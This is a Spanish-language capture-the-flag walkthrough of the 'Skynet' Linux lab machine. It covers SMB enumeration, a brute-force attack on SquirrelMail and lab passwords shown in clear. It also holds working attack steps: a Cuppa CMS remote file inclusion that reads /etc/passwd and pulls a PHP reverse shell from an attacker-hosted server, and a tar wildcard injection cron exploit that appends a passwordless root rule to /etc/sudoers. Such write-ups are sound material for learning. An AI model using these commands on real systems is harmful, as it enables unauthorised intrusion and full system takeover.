# Skynet

## 🖥️ Sistema

Linux

---

## 🎯 Objetivo del laboratorio

Comprometer una máquina Linux mediante la enumeración de servicios web y SMB, obtener credenciales a través de información expuesta, explotar una vulnerabilidad **Remote File Inclusion (RFI)** en **Cuppa CMS** para conseguir acceso inicial y escalar privilegios aprovechando una **Wildcard Injection** sobre una tarea **cron** que ejecuta `tar`.

---

## 🛠️ Tecnologías trabajadas

- AutoNmap
- Incursore
- FFUF
- SMB
- SquirrelMail
- Burp Suite
- Cuppa CMS
- Remote File Inclusion (RFI)
- PHP Reverse Shell
- Cron Jobs
- Wildcard Injection
- Tar

---

## 🧠 Metodología

La enumeración inicial reveló varios servicios de autenticación y compartición de archivos, destacando **SMB**, **POP3**, **IMAP** y un servicio web. La combinación de estos servicios sugería que la obtención de credenciales podría depender de la correlación de información entre distintos vectores.

La investigación comenzó por la aplicación web, donde el descubrimiento de **SquirrelMail** llevó a enumerar los recursos compartidos mediante SMB. Un recurso anónimo contenía información suficiente para realizar un ataque de fuerza bruta contra el correo del usuario **Miles Dyson**, obteniendo acceso a su buzón y recuperando una nueva contraseña.

Con las credenciales actualizadas fue posible acceder a un recurso SMB privado, donde encontré un directorio oculto que conducía a una instalación de **Cuppa CMS**. Tras identificar una vulnerabilidad de **Remote File Inclusion**, conseguí ejecutar una **reverse shell** como `www-data`.

Finalmente, la enumeración del sistema permitió descubrir una tarea **cron** vulnerable que utilizaba `tar` con un comodín (`*`). Aprovechando una **Wildcard Injection**, logré modificar la configuración de `sudo` y obtener acceso como **root**.

---

## 🚀 Explotación

### 1. Enumeración inicial

Comencé realizando un reconocimiento con **AutoNmap** e **Incursore**.

Los servicios detectados fueron:

| Puerto | Servicio |
|---------|----------|
| 22 | SSH |
| 80 | HTTP |
| 110 | POP3 |
| 139 | NetBIOS |
| 143 | IMAP |
| 445 | SMB |

La presencia de servicios de correo y recursos compartidos indicaba que la obtención de credenciales probablemente implicaría combinar información procedente de varias fuentes.

---

### 2. Enumeración web

Accedí a la aplicación web principal.

```text
http://10.130.151.63
```

La página mostraba únicamente un buscador perteneciente al servicio **Skynet**, sin funcionalidades adicionales.

Realicé un fuzzing de directorios.

```bash
ffuf -w /usr/share/wordlists/SecLists-master/Discovery/Web-Content/raft-medium-directories.txt -u http://10.130.151.63/FUZZ
```

Entre los directorios descubiertos aparecieron:

- `/admin`
- `/config`
- `/css`
- `/js`
- `/squirrelmail`
- `/ai`
- `/server-status`

El recurso más interesante era:

```text
/squirrelmail
```

que contenía un formulario de autenticación.

---

### 3. Enumeración SMB

Al detectar el servicio SMB enumeré los recursos compartidos.

```bash
smbclient -L //10.130.151.63/ -N
```

Durante la enumeración apareció un usuario del sistema.

```text
MilesDyson
```

Probé los recursos compartidos accesibles sin autenticación.

```bash
smbclient //10.130.151.63/anonymous/ -N
```

Dentro encontré varios archivos interesantes, entre ellos:

- Un aviso indicando que todos los usuarios debían cambiar sus contraseñas.
- Un archivo llamado:

```text
log1.txt
```

El contenido correspondía a una lista de posibles contraseñas.

---

### 4. Obtención de credenciales

Utilicé **Burp Suite Intruder** para realizar un ataque de fuerza bruta contra el portal de **SquirrelMail**.

Usuario:

```text
milesdyson
```

Lista de contraseñas:

```text
log1.txt
```

Resultado:

```text
milesdyson:cyborg007haloterminator
```

Con estas credenciales inicié sesión correctamente en el correo.

---

### 5. Enumeración del correo

Tras acceder a **SquirrelMail** revisé los mensajes disponibles.

Uno de ellos contenía la nueva contraseña del usuario.

```text
Usuario: milesdyson

Contraseña:
)s{A&2Z=F^n_E.B'
```

Con esta nueva credencial ya era posible acceder a los recursos privados del usuario.

---

### 6. Descubrimiento de Cuppa CMS

Accedí al recurso SMB del usuario autenticado.

```bash
smbclient //10.130.151.63/milesdyson -U milesdyson
```

Durante la exploración encontré el archivo:

```text
important.txt
```

Su contenido revelaba un directorio oculto.

```text
/45kra24zxs28v3yd
```

Accedí al mismo desde el navegador.

```text
http://10.130.151.63/45kra24zxs28v3yd
```

Realizando una nueva enumeración descubrí:

```text
/administrator
```

El panel pertenecía a:

```text
Cuppa CMS
```

---

### 7. Acceso inicial

Busqué vulnerabilidades públicas del CMS.

```bash
searchsploit Cuppa CMS
```

Encontré una vulnerabilidad de:

```text
Remote File Inclusion (RFI)
```

Comprobé la existencia de la vulnerabilidad leyendo el archivo:

```text
/etc/passwd
```

mediante la siguiente URL.

```text
/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd
```

Al visualizar correctamente el contenido confirmé la vulnerabilidad.

Preparé una reverse shell en PHP.

```text
shell.php
```

La compartí mediante un servidor HTTP.

```bash
python3 -m http.server
```

Preparé un listener.

```bash
nc -lvnp 4444
```

Finalmente ejecuté la vulnerabilidad indicando la URL del payload.

```text
http://10.130.151.63/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://192.168.131.12:8000/shell.php
```

Recibí una shell como:

```text
www-data
```

Durante la enumeración local recuperé la flag de usuario.


---

### 8. Escalada de privilegios

Comencé revisando los permisos disponibles.

```bash
sudo -l
```

No disponía de la contraseña del usuario, por lo que continué enumerando las tareas programadas.

```bash
cat /etc/crontab
```

Encontré un script ejecutado automáticamente cada minuto.

```text
/home/milesdyson/backups/backup.sh
```

Su contenido era:

```bash
#!/bin/bash
cd /var/www/html
tar cf /home/milesdyson/backups/backup.tgz *
```

El uso del comodín (`*`) con `tar` hacía posible una **Wildcard Injection**.

Me situé en el directorio correspondiente.

```bash
cd /var/www/html
```

Creé el primer archivo.

```bash
echo "" > "--checkpoint-action=exec=sh shell.sh"
```

Después el segundo.

```bash
echo "" > --checkpoint=1
```

Finalmente preparé el script malicioso.

```bash
nano shell.sh
```

Contenido:

```bash
echo "www-data ALL=(root) NOPASSWD: ALL" >> /etc/sudoers
```

Cuando la tarea programada ejecutó nuevamente `tar`, el programa interpretó los archivos como opciones de línea de comandos y ejecutó automáticamente el script.

Tras esperar aproximadamente un minuto ejecuté:

```bash
sudo su
```

Obteniendo acceso como:

```text
root
```

---

### 9. Obtención de la flag final

Con privilegios elevados accedí al directorio del administrador.

```bash
cd /root
```

Leí el archivo:

```text
root.txt
```


---

## 📚 Lecciones aprendidas

- Este laboratorio mostró una cadena de explotación muy completa donde la correlación de información obtenida desde distintos servicios resultó fundamental para comprometer el sistema.
- Enumerar recursos compartidos SMB tanto anónimos como autenticados.
- Obtener credenciales a partir de información expuesta en recursos compartidos.
- Realizar ataques de fuerza bruta contra **SquirrelMail** utilizando **Burp Suite**.
- Aprovechar credenciales obtenidas por correo para acceder a nuevos recursos.
- Descubrir directorios ocultos durante la enumeración de archivos compartidos.
- Identificar y explotar una vulnerabilidad **Remote File Inclusion (RFI)** en **Cuppa CMS**.
- Obtener acceso inicial mediante una **reverse shell** en PHP.
- Enumerar tareas **cron** para identificar vectores de escalada de privilegios.
- Comprender el funcionamiento de la **Wildcard Injection** sobre `tar`.
- Escalar privilegios modificando la configuración de `sudo` mediante una tarea programada vulnerable.
